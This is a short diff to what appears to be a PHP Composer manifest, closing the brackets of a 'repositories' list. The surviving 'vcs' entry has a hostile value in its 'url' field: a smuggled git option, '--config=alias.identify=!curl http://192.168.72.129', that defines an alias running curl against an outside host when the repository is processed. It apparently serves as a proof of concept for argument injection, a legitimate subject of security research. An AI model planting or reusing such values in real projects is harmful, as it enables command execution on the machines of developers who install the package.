@@ -45,7 +45,8 @@
         {
             "type": "vcs",
             "url": "--config=alias.identify=!curl http://192.168.72.129"
-        },
+        }
+    ],
     "suggest": {
         "ext-soap": "To be able to generate mocks based on WSDL files"
     },
